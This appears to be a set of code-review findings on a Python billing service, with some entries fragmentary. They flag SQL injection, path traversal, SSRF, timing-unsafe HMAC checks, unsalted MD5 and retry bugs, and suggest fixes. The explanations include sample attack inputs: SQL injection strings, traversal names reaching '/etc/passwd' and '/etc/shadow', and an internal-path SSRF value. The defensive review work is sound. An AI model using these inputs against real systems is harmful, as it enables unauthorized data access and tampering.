Impact: any authenticated user can enumerate or guess `pm_id` values and rewrite the billing name on payment methods belonging to other accounts — cross-tenant data tampering, and a plausible stepping stone for fraud/social-engineering against the real cardholder.

`read_export_preview` joins the caller-supplied `name` directly onto `EXPORT_ROOT` and opens the result. `os.path.join` does not confine: a `name` of `../../etc/passwd` resolves outside the export root, and an absolute `name` (e.g. `/etc/shadow`) discards `EXPORT_ROOT` entirely. Returning only `limit` bytes does not mitigate anything \u2014 the first 4096 bytes of an arbitrary file are still disclosed.

Since the sibling function is presumably tested for this exact concern, the absence of an equivalent test here means a regression or the existing bug would go undetected.

findings.title: Public function `read_export_preview` lacks documentation of path safety contract
findings.body: The new `read_export_preview` function accepts a `name` parameter that is passed directly to `os.path.join(EXPORT_ROOT, name)` without any apparent confinement or validation. A caller reading the signature alone cannot determine whether this function is safe to call with untrusted input, or what constraints apply to the `name` parameter. findings.title: SQL injection via f-string in search_customers
findings.body:
`search_customers` interpolates `term` and `status` straight into the SQL text with an f-string and then calls `execute(sql)` with no params, so the values are parsed by the database as query syntax. A value such as `' OR '1'='1` in `status`, or `%' UNION SELECT ... -- ` in `term`, changes the meaning of the statement — allowing arbitrary reads from other tables (or writes/stacked statements, depending on driver settings).

Use the same parameterised form as `get_customer` on line 5 and let the driver bind the values, keeping the wildcards in the parameter rather than the SQL:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

Note the single-quote wrapping in the current code (`'%{term}%'`) also means quoting the input is not enough — only binding is.

findings.title: search_customers interpolates values instead of passing params to execute()
findings.body:
`billing.db.execute(sql, params=None)` documents that "`params` must carry every caller value", and the sibling function `get_customer` on line 5 follows it (`execute("... id = %s", (customer_id,))`). `search_customers` instead formats `term` and `status` directly into the SQL text and calls `execute(sql)` with no params, so the driver never quotes or escapes them.

Two concrete consequences:

1. Correctness for legitimate input: a name such as `O'Brien` closes the string literal early and the statement fails to parse (or, worse, parses as something else). Any customer name or status containing `'` or `\` is unsearchable.
2. The same missing quoting is a direct SQL injection path for attacker-controlled `term`/`status`.

Fix by keeping every value in the parameter tuple and letting the driver build the pattern, e.g.:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

Note the wildcards must move into the *parameter*, not stay in the SQL text, so the `%` characters are no longer part of the statement the driver scans.

findings.title: verify_endpoint skips the ALLOWED_HOSTS invariant enforced above it
findings.body:
The function immediately above this one parses the destination and rejects anything whose host is not in `ALLOWED_HOSTS` before issuing a request. `verify_endpoint` takes the same kind of caller-supplied `url` and passes it straight to `requests.get` with no host or scheme check, so the module's own invariant ("we only talk to allowlisted destinations") no longer holds for every outbound request. A caller can point it at an internal address (link-local metadata, localhost admin ports) or a non-HTTP scheme such as `file://`, and the returned status code leaks whether that target exists. Apply the same parse-and-check logic used on lines 8-9 before the request, and disable redirect following so a permitted host cannot bounce the request to a disallowed one.

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same hex-digest HMAC as `verify_stripe` but returns `expected == header`. `str.__eq__` short-circuits on the first differing byte, so the comparison time leaks how many leading hex characters of the expected signature an attacker-supplied `header` matched; with a repeatable webhook endpoint that is enough to recover a valid signature byte-by-byte without knowing `secret`. Use the same primitive as the function directly above: `return hmac.compare_digest(expected, header)`.

Secondary behavioural difference worth noting while changing it: `==` silently returns `False` for a `None` or non-string `header`, whereas `compare_digest` raises `TypeError`. If callers rely on one of those shapes, normalise `header` explicitly rather than depending on the operator.

findings.title: Password reset path hashes passwords with unsalted MD5
findings.body: `hash_reset_password` derives a stored password value with a single unsalted MD5 digest. MD5 is fast (billions of guesses/second on commodity GPUs) and unsalted, so a leaked table of these digests is recoverable by rainbow tables or brute force almost immediately, and identical passwords produce identical digests. The same module already establishes the correct primitive on line 7: `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())`. If a password set via the reset flow must be verifiable by the normal login path, having two different hash formats also suggests a verification branch that accepts MD5 digests — which would let anyone with database read access authenticate as any user after cracking a trivially weak digest. Delete this function and call `hash_password` from the reset flow; if a migration is needed, re-hash with bcrypt on next successful login rather than persisting MD5.

findings.title: Reset path produces MD5 digest incompatible with bcrypt verification
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), which callers almost certainly verify with `bcrypt.checkpw`. `hash_reset_password` returns a bare 32-hex-char MD5 digest for the same conceptual value (a stored password). If both write to the same credential field, a password set through the reset flow can never be verified: `bcrypt.checkpw` against a non-bcrypt hash either raises `ValueError` (invalid salt) or returns False, locking the user out. Unless there is an explicit format-discriminating verifier, the reset flow should call `hash_password` so the stored format stays uniform (which also removes the unsalted-MD5 problem).

For any row value containing a comma or a double quote (free-text fields, names like "Doe, Jane"), the emitted line has more fields than `columns` and/or unbalanced quotes, so the output is unparseable by any CSV reader. Wrap each value: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. The same applies to `csv_header` if column names can contain commas. findings.title: Blocking requests.get inside async handler stalls the event loop
findings.body:
`fetch_plan_limits` is a coroutine but contains no `await`; the only I/O is a synchronous `requests.get` with a 5-second timeout. When awaited from an async request handler this blocks the entire event loop thread for the duration of the call, so every other in-flight request on that worker stalls too — including the `httpx` call in `fetch_plan` directly above, which was written to yield properly. A slow or hanging billing host turns into a whole-worker stall rather than one slow request.

Use the same async client style as `fetch_plan`, e.g. accept an `httpx.AsyncClient` (or construct one) and `response = await client.get(...)`. If `requests` must be kept, at minimum push it off the loop with `anyio.to_thread.run_sync` / `loop.run_in_executor`, and drop the misleading `async` keyword if nothing is awaited.

Since the existing fetch_plan has no visible test either, this isn't a policy gap unique to this PR, but this is a meaningful behavior change (new blocking I/O path) that ships with zero coverage to catch a regression such as the call hanging or raising unexpectedly.

findings.title: Unescaped tenant_id interpolated into internal billing URL path
findings.body:
`tenant_id` is dropped straight into the path of an internal, presumably unauthenticated service (`https://billing.internal/...`) with an f-string. If `tenant_id` can reach this function from request input, a value such as `../../admin/keys` or one containing `?`/`#` lets the caller steer the request at other paths on the internal host — a server-side request forgery against a service that is likely reachable only from this process. Coerce and encode the value before building the URL, e.g. `urllib.parse.quote(str(tenant_id), safe="")`, or better, validate it against the expected tenant-id shape (UUID / integer) and reject anything else. Passing it as a `params`/path component via a client that escapes segments is also acceptable.

Note the same pattern exists on line 6 for the httpx call; it is pre-existing but worth fixing together.

findings.title: Bare except swallows KeyboardInterrupt/SystemExit and logs nothing
findings.body:
`except:` catches `BaseException`, so Ctrl-C (`KeyboardInterrupt`), interpreter shutdown (`SystemExit`) and `GeneratorExit` raised while `_client.send` is in flight are converted into a silent `return None`. A process being shut down or interrupted during a metrics push will appear to succeed and keep running, and generator cleanup semantics are broken if this is ever called inside a generator. The failure is also discarded entirely — no log, no counter — so a permanently broken telemetry endpoint is indistinguishable from a healthy one.

Narrow this to the exception class the client actually raises (or at minimum `except Exception:`), and log the exception before returning: `except Exception: logger.warning("metrics push failed", exc_info=True); return None`.

If this behavior were reverted or broken (e.g. exception re-raised, or wrong return value), no test would fail.

findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, decides against `LIMIT` on line 16, then yields to the event loop on line 18 before writing on line 19 — all outside `_lock`. Any other coroutine scheduled during the `await` can run the same check against the same stale `current`, so N concurrent callers can each pass the limit check and the tenant ends up well over `LIMIT`. The existing `consume` on lines 9-11 demonstrates the intended discipline: hold `_lock` for the whole read-modify-write. Wrap the check and the assignment in `async with _lock:` (and do not await anything inside the critical section other than the lock acquisition itself).

No test in this diff exercises concurrent invocations of try_consume to detect this, so a fix or a regression of the locking behavior would go unnoticed.

findings.title: Retry wraps non-idempotent charge, risking duplicate charges
findings.body:
`charge()` is documented as NOT idempotent — each call creates a new charge. Wrapping it in `@retry(attempts=3)` means any failure that happens *after* the gateway has accepted the POST (timeout, dropped connection, 5xx emitted post-commit) causes a second and possibly third charge against the same card, so the customer is billed up to 3x.

The gateway already provides the fix: it supports an `Idempotency-Key` header. Generate a single key per logical charge attempt *outside* the retry loop and pass it through `charge(...)`, so all attempts collapse to one charge server-side. Until `charge()` accepts and forwards such a key, this function should not be retried at all. Note the retry on `fetch_charge` (a GET, documented safe to repeat) is correct — the problem is specific to the new wrapper.

findings.body: The `charge_card` function wraps `gateway.charge`, which is explicitly documented as non-idempotent ('each call creates a new charge'). The wrapper function retries this call up to 3 times without documenting or enforcing the Idempotency-Key requirement that the underlying function states is necessary to make retries safe. A caller using this function is not warned that retries could result in duplicate charges.

If a transient failure occurs after the charge succeeds server-side (e.g. timeout on the response), retry will re-invoke charge and create a duplicate charge. No test exists to verify that charge_card either passes an idempotency key, avoids retrying non-idempotent failures, or that retries do not cause duplicate charges. findings.body: contactEmail accesses account.billingContact.email without optional chaining, even though Account.billingContact is optional (per types.ts). If account.billingContact is undefined, this throws a TypeError at runtime. There is no test in this diff exercising contactEmail with an account lacking billingContact, so this crash would go undetected until it hits production.

findings.title: Mutating function named get_* violates caller expectations
findings.body: The function `get_tenant_fresh()` follows the `get_*` naming convention but mutates the cache on every call (lines 10–12). Callers accustomed to `get_tenant()` on line 4 (which is read-only) will reasonably assume this is also read-only. The mutation—including the cache-clearing logic—is a side effect that belongs in the function's contract but is invisible in the name. Rename to `fetch_and_cache_tenant()` or similar to signal mutation, or document the side effects prominently if the name must stay.

findings.title: Size-bound eviction clears the entry just fetched
findings.body:
When the cache crosses 1000 entries, `_CACHE.clear()` runs *after* the new tenant has been inserted, so the freshly fetched value is thrown away along with everything else. A caller that does `get_tenant_fresh(id)` and then relies on `get_tenant(id)` (the normal pattern for a warm-then-read helper) gets `None` back on exactly the request that triggered the flush, and every other tenant in the process loses its cached entry at once — a thundering herd of `_fetch` calls right after.

If a size bound is wanted, evict before inserting and keep the new entry, or drop a bounded subset (e.g. use an LRU such as `functools.lru_cache`/`OrderedDict.popitem(last=False)`) rather than emptying the whole map.

findings.title: get_tenant_fresh has no test covering its cache-mutation logic
findings.body: get_tenant_fresh fetches, writes to _CACHE, and clears the entire cache once size exceeds 1000. None of this is exercised by any test in the diff. If the eviction condition were off-by-one, or if _CACHE were clobbered incorrectly (e.g. clearing instead of evicting oldest), nothing would fail. Add a test that calls get_tenant_fresh, asserts the cache is populated with the fetched value, and asserts the clear-at-1000 boundary behaves as intended.

findings.title: A None result from _fetch is cached as if it were a tenant
findings.body: `tenant` is stored unconditionally, so if `_fetch` returns `None` for an unknown or not-yet-provisioned tenant, `None` is written into `_CACHE`. `get_tenant` (line 5) returns `None` for both "absent from cache" and "cached as missing", so the negative result is now sticky and indistinguishable from a miss, and repeated lookups of bad ids count toward the 1000-entry bound that triggers the flush. Either skip the write when `tenant is None`, or make the sentinel for "known missing" distinct from the sentinel for "not cached".

findings.title: Whole-cache wipe on size threshold allows cache-flush amplification
findings.body: `get_tenant_fresh` inserts an entry for whatever `tenant_id` it is given and, once `_CACHE` exceeds 1000 entries, clears the entire cache rather than evicting a single entry. If `tenant_id` is reachable from untrusted input (e.g. a path or header parameter on a request handler), a caller can enumerate ~1000 arbitrary ids to evict every legitimate tenant entry, after which all subsequent `get_tenant` calls miss and fall through to `_fetch`, amplifying one cheap request into backend load for every tenant. Prefer a bounded LRU (e.g. `functools.lru_cache` or an explicit eviction of the oldest key) instead of `clear()`, and only cache ids that resolved to a real tenant.

findings.title: Renaming page_size to limit breaks keyword-argument callers

`list_invoices` is a module-level function whose second parameter changed name from `page_size` to `limit`.
